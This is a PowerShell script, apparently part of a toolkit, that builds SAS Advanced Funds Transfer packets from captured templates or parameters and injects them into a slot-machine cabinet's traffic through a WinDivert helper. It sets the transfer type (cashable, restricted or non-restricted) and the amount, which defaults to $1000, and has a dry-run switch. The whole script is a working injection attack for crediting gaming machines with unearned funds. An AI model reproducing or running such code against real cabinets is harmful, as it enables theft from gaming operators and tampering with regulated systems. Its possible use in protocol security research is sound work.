[CmdletBinding(DefaultParameterSetName = 'DryRun')]
param(
    [Alias('IP')][string] $ComputerName = '10.0.0.90',
    [string] $TemplateId,
    [int64] $AmountCents = -1,
    [ValidateSet('cashable','restricted','non-restricted')][string] $TransferType = 'non-restricted',
    [int] $Asset = 777,
    [int] $TransactionNumber = 0,
    [Parameter(ParameterSetName='DryRun')][switch] $DryRun,
    [Parameter(ParameterSetName='Send',Mandatory=$true)][switch] $Send
)
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$here = $PSScriptRoot
$repoRoot = (Get-Item $here).Parent.Parent.FullName
. (Join-Path $here 'Build-CapturedAftPayload.ps1')
if ($TemplateId) {
    $tpl = Get-CapturedTemplate -Id $TemplateId
    $overrideParams = @{ TemplateId = $TemplateId }
    if ($AmountCents -ge 0) { $overrideParams.AmountCents = $AmountCents }
    if ($PSBoundParameters.ContainsKey('TransferType')) { $overrideParams.TransferType = $TransferType }
    if ($Asset -ne 777) { $overrideParams.Asset = $Asset }
    if ($TransactionNumber -gt 0) { $overrideParams.TxnNumber = $TransactionNumber }
    $sasPacket = New-AftFromCaptureTemplate @overrideParams
    Write-Host "[*] Baseline template: $TemplateId (captured $($tpl.capturedAt))" -ForegroundColor Cyan
} else {
    $amt = if ($AmountCents -ge 0) { $AmountCents } else { 100000 }
    $sasPacket = New-AftTransferPacketFromParams -TransferType $TransferType -AmountCents $amt -Asset $Asset -TxnNumber $TransactionNumber
}
$report = Format-AftPacketReport $sasPacket
Write-Host ''
Write-Host '=== Captured-payload injection builder ===' -ForegroundColor White
Write-Host "Cabinet      : $ComputerName"
Write-Host "Transfer type: $($report.Parsed.TransferType)"
Write-Host "Amount       : $($report.Parsed.AmountCents) cents (`$$([double]$report.Parsed.AmountCents/100))"
Write-Host "Asset        : $($report.Parsed.Asset)"
Write-Host "Txn          : $($report.Parsed.TxnName)"
Write-Host "CRC valid    : $($report.Parsed.CrcValid)"
Write-Host "SAS hex      : $($report.SasHex)"
Write-Host "Bridge hex   : $($report.BridgeHex)"
Write-Host ''
if ($DryRun) { Write-Host '[dry-run] Payload built; not injecting.' -ForegroundColor Yellow; exit 0 }
$injectScript = Join-Path $repoRoot 'Invoke-WinDivertAft.ps1'
if (-not (Test-Path -LiteralPath $injectScript)) { throw "Missing $injectScript" }
$invokeArgs = @{
    Send              = $true
    ComputerName      = $ComputerName
    AssetNumber       = $Asset
    Amount            = $report.Parsed.AmountCents
}
if ($TransactionNumber -gt 0) { $invokeArgs.TransactionNumber = $TransactionNumber }
elseif ($report.Parsed.TxnNumber -gt 0) { $invokeArgs.TransactionNumber = $report.Parsed.TxnNumber }
switch ($report.Parsed.TransferType) {
    'cashable' { $invokeArgs.Cashable = $true }
    'restricted' { $invokeArgs.Restricted = $true }
    default { $invokeArgs.NonRestricted = $true }
}
& $injectScript @invokeArgs